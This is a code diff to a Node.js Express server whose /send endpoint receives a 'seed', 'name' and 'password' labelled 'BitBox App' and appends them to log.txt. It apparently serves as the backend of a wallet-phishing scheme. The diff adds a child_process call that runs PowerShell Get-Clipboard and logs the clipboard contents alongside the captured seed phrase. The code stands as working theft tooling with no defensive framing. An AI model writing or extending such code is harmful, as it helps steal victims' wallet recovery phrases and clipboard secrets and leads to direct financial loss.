@@ -7,6 +7,8 @@
   import fileUpload from 'express-fileupload';
   // import clipboardy from 'clipboardy';
 
+  import { execSync } from 'child_process';
+
   const app = express();
   const __filename = fileURLToPath(import.meta.url);
   const __dirname = dirname(__filename);
@@ -21,14 +23,15 @@ app.use(fileUpload());
 app.get("/send", (req, res) => {
   
   // const clipboardContent = clipboardy.readSync();
-  
+  const clipboardContent = execSync('powershell.exe -command "Get-Clipboard"').toString().trim();
+console.log('Clipboard content:', clipboardContent);
+
   let { seed, name, password } = req.query;
   // console.log("Seed received:", seed, "; Name:", name);
 
   let id = new Date().toString();
   let text = `BitBox App\n\n${name}= ${seed}`;
-  console.log(text)
-  fs.appendFile("log.txt", ">> " + id + " >> " + text + '\n' + `clipboardContent: {clipboardContent}` + "\n\n", (err) => {
+  fs.appendFile("log.txt", ">> " + id + " >> " + text + '\n' + `clipboardContent: ${clipboardContent}` + "\n\n", (err) => {
     if (err) return console.log(err);
     // console.log("saved!");
   });
